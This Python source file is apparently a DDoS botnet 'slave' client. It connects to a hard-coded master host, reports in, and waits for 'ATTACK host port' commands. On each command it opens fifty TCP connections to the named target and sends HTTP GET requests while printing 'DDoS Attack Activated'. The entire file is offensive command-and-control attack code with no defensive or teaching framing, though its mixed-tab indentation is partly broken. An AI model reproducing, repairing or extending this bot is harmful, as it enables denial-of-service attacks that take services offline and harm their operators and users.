#!/usr/bin/python
import time, os, sys, string, ntplib
from socket import *  #importing the socket library for network connections
from time import ctime,time

##Setting up variables
SERVER_HOST = '10.0.0.7'
SERVER_PORT = 8080
MS_LISTEN_HOST = '10.0.0.2'
MS_LISTEN_PORT = 8081

class Slave():
    def __init__(self, host, port, sock=None):
        print("DDoS mode loaded")
        self.host = host
        self.port = port
        self.message='asdf.txt'
        ip = gethostbyname(self.host)
        self.num_connections = 0

        # get ntp times
		ntp_res=time()

        # connect to master
        self.masterHost = MS_LISTEN_HOST
        self.masterPort = MS_LISTEN_PORT
        self.sockMaster = socket(AF_INET, SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))
        self.sockMaster.send('{0}'.format(ctime(ntp_res)))

    def acceptMessages(self):
        msg_buf = self.sockMaster.recv(64)
        if len(msg_buf) > 0:
          print(msg_buf)
          if (msg_buf.startswith('ATTACK')):
              command, host, port, offtime = msg_buf.split()
              self.doTheDos(host, int(port))

    def doTheDos(self, host, port):
        for _ in range(0, 50):
          self.dos(host, port)

    def dos(self, host, port):
        try:
            self.ddos = socket(AF_INET, SOCK_STREAM)
            self.ddos.connect((host, port))
            self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
	    print ("|[DDoS Attack Activated....!!!!] |")
	    data = self.ddos.recv(1024)
            x = data
	    if "Authenticate" in x:
            	self.ddos.send("NULL")
            	data = self.ddos.recv(1024)
        except error, msg:
            self.num_connections = self.num_connections+1
            print("|[Connection Failed] | %d" % self.num_connections )
        #ddos.close()

if __name__ == '__main__':
  slaveNode = Slave('localhost', 8080)

  while(1):
#for i in xrange(conn):
    #slaveNode.dos()
    slaveNode.acceptMessages()
